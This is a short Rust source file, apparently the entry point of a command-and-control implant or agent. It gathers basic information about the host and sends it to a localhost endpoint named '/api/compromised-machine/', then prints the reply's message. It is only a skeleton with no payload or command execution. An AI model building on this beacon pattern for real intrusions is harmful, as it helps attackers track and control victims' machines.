mod basicinfo;
mod requests;
mod utils;
use reqwest::Method;
use serde::{Deserialize, Serialize};
use requests::send_json_request;


fn main() {
    let url = "http://localhost/api/compromised-machine/";
    let info = basicinfo::basic_info();
    let get_resp  = send_json_request(Method::GET, url, Some(&info));

    let message = match get_resp {
        Ok(resp) => resp,
        Err(e) => {
            eprintln!("Error sending request: {}", e);
            return;
        }
    };

    if let Some(title) = utils::get_string_from_json(&message, "message") {
        println!("Title: {}", title);
    } else {
        println!("No title found in the response.");
    }

   
}
